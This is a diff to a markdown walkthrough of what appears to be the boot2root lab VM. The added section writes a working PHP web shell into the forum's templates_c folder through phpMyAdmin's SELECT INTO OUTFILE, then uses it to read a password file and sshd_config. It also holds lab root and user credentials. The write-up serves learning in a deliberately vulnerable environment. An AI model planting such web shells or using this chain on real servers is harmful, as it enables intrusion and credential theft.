@@ -10,6 +10,7 @@
   * [Exploring the forum](#exploring-the-forum)
   * [Reading lmezard emails](#reading-lmezard-emails)
   * [Exploiting phpmyadmin](#exploiting-phpmyadmin)
+  * [lmezard user](#lmezard-user)
 
 <small><i><a href='http://ecotrust-canada.github.io/markdown-toc/'>Table of contents generated with markdown-toc</a></i></small>
 
@@ -200,3 +201,54 @@ with the following credentials:
 user: root
 pass: Fg-'kKXBj87E:aJ$
 ```
+
+we would like to have a shell access, which we could do by writing ourselves a page specially for it with a SQL request.
+For this we need a folder with write rights.
+
+Luckily for us, they use the template [my little forum](https://github.com/ilosuna/mylittleforum) for the forum.
+
+Reading the README.md, one detail attract our attention :
+
+```
+Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script.
+```
+
+we now know where to write : `/var/www/forum/templates_c/`!
+
+```sql
+SELECT "<html><body><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><pre><?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre> </body><script>document.getElementById(\"cmd\").focus();</script></html>"
+INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
+```
+
+we can now access this shell interface with [https://192.168.1.7/forum/templates_c/cmd.php](https://192.168.1.7/forum/templates_c/cmd.php)
+
+looking at the home :
+
+```sh
+ls /home
+LOOKATME
+ft_root
+laurie
+laurie@borntosec.net
+lmezard
+thor
+zaz
+```
+
+`LOOKATME` is a directory containing only a file named `password`, let's cat it:
+
+```sh
+cat /home/LOOKATME/password
+lmezard:G!@M6f4Eatau{sF"
+```
+
+It's a password containing the credentials to user `lmezard` for conencting to the vm.
+
+Having a look at `sshd_config` let us know we will not be able to ssh with it, let's connect to the vm directly.
+
+```sh
+cat /etc/ssh/sshd_config | grep AllowUsers
+AllowUsers ft_root zaz thor laurie
+```
+
+## lmezard user
